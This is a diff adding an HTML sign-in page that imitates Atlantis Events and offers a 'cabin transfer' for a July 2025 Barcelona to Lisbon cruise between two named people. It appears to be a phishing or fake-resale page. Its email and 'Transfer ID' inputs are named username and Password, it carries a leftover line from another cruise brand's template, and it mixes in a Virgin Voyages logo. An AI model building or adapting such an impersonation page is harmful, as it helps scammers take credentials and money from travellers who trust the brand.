@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Barcelona to Lisbon Cruise - Atlantis Events</title>
+    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./checkoutPage/fontawesome-free-6.7.2-web/css/all.min.css">
+</head>
+
+<body>
+    <div id="EverythingContainer">
+        <section class="Header-section">
+            <div class="header-max-width">
+                <!-- <p>Dave Koz Cruise Reservations</p> -->
+                <a href="#"><img src="./login-images/atlantis-logo.png" alt="Atlantis"></a>
+
+                <div id="LangDropdown" class="dropdown">
+                    <button class="dropbtn" onclick="toggleDropdown()">
+                      <div id="selected-lang" style="display: flex;">
+                        <img src="./login-images/icons8-usa-48.png" alt="USA">
+                        <span>EN</span>
+                      </div>
+                      <i class="fa fa-angle-right" style="margin: auto 0;"></i>
+                    </button>
+                    <div id="LangOptions" class="dropdown-content">
+                      <p class="Langs" id="USA" onclick="selectLanguage(this)"><img src="./login-images/icons8-usa-48.png" alt="USA"><span>EN</span></p>
+                      <p class="Langs" id="DE" onclick="selectLanguage(this)"><img src="./login-images/icons8-germany-48.png" alt="DE"><span>DE</span></p>
+                      <p class="Langs" id="FR" onclick="selectLanguage(this)"><img src="./login-images/icons8-france-48.png" alt="FR"><span>FR</span></p>
+                      <p class="Langs" id="ES" onclick="selectLanguage(this)"><img src="./login-images/icons8-spain-48.png" alt="ES"><span>ES</span></p>
+                    </div>
+                </div>
+                <!-- <img id="menuBar" src="./Barsmenu.svg" alt="Menu"> -->
+                <div></div>
+            </div>
+        </section>
+
+        <section id="SubHeaderOrange">
+            <div style="max-width: 1000px; display: flex; align-items: center; line-height: 1.5; margin: 0 auto;">
+                <div style="width: 20%;">
+                    <img src="./login-images/VV_Portrait_Logo.jpg" alt="voyages">
+                </div>
+                <div style="width: 60%; text-align: center;">
+                    <p style="font-size: 16px;" data-translate="voyageName">Virgin Voyages</p>
+                    <a data-translate="voyageDate">July 13 - 22, 2025</a>
+                </div>
+                <div style="width: 20%; display: flex;">
+                    <i class="fa fa-check"></i>
+                </div>
+                </div>
+            </section>
+
+        <section id="max-widthSection">
+            <section class="signinsection">
+                <p id="signinMess" data-translate="signinMess">Sign in cabin transfer</p>
+                <p data-translate="signinText">Sign into your Atlantis Cruise reservation secure transfer by entering your Email and Transfer ID.</p>
+                <br>
+                <br>
+                <p data-translate="enterEmail">Enter your email and Transfer ID to access this check out page, please click on "SIGN IN" to continue</p>
+                <br>
+            </section>
+
+            <section id="fillinInArea">
+                <form id="formiD">
+                    <p id="AKInfo" data-translate="AKInfo">Purchaser's Information</p>
+                    <div id="Line"></div>
+                    <div class="UsernameDivContainer">
+                        <label for="Email"></label>
+                        <p class="UserNDpassw" data-translate="email">Email</p>
+                        <input id="UsernameID" class="FilBoxes" type="text" name="username" required>
+                    </div>
+                    <div class="PasswordDivContainer">
+                        <label for="ID"></label>
+                        <p class="UserNDpassw" data-translate="transferID">Transfer ID</p>
+                        <input id="PasswordID" class="FilBoxes" type="text" name="Password" required>
+                    </div>
+                    <button type="submit" id="sign-IN-BTN" data-translate="signIn">SIGN IN</button>
+                </form>
+            </section>
+            <section id="DownMessageArea">
+                <!-- <p data-translate="noTransferID">This Cabin transfer was initiated by Nicole Watson to Jim McNab</p> -->
+
+                <p data-translate="noTransferID">Barcelona to Lisbon Cruise, July 13 - 22, 2025 Cabin transfer between Nicol Watkin (Transferor) and James McNab (Purchaser)</p>
+            </section>
+            <div id="Line"></div>
+        </section>
+    </div>
+    <div class="footerContainer-Div">
+        <section class="footerSec">
+            <div class="subFooter">
+
+                <div id="brands-container">
+                    <a href="https://www.facebook.com/AtlantisEvents"><i class="fab fa-facebook-f"></i></a>
+                    <a href="https://twitter.com/AtlantisEvents"><i class="fab fa-twitter"></i></a>
+                    <a href="https://www.instagram.com/atlantisevents/"><i class="fab fa-instagram"></i></a>
+                    <a href="https://www.youtube.com/user/atlantiseventsinc"><i class="fab fa-youtube"></i></a>
+                </div>
+
+                <img src="./login-images/atlantis-logo.png" alt="Atlantis">
+
+                <p id="FestLocationAddress" data-translate="footerAddress">Atlantis Events, Inc.<br>9200 Sunset Blvd, Suite 500<br>West Hollywood, CA 90069</p>
+
+                <p id="copyrightText" data-translate="copyright"> 2025 Atlantis Events, Inc. All rights reserved.<br>CST# 2033720-40</p>
+
+                <div style="display: flex; justify-content: center;">
+                    <a href="https://atlantisevents.kinsta.cloud/privacy-policy/" data-translate="policyPrivacy">Policy Privacy</a>
+                    <line style="min-width: 1px; background-color: hsl(0, 0%, 10%); transform: scaleY(70%); margin: 0 6px;">
+                    </line>
+                    <a href="https://atlantisevents.kinsta.cloud/accessibility/" data-translate="accessibility">Accessibility</a>
+                </div>
+            </div>
+        </section>
+    </div>
+    <script src="./index.js"></script>
+</body>
+
+</html>
